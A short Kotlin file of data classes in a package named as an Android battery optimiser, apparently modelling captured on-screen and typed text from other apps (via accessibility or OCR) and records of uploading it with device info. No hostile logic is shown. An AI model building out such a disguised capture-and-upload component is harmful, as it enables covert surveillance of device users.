package com.android.batteryoptimization

import com.google.gson.annotations.SerializedName

data class InputEvent(
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String? = null,
    @SerializedName("text") val text: String,
    @SerializedName("source") val source: String = "accessibility",  // "accessibility" or "ocr"
    @SerializedName("isUploaded") val isUploaded: Boolean = false
)

/** 一次完整的上报记录（用于调试查看） */
data class UploadRecord(
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("success") val success: Boolean,
    @SerializedName("requestBody") val requestBody: String,
    @SerializedName("deviceInfo") val deviceInfo: String,
    @SerializedName("response") val response: String
)
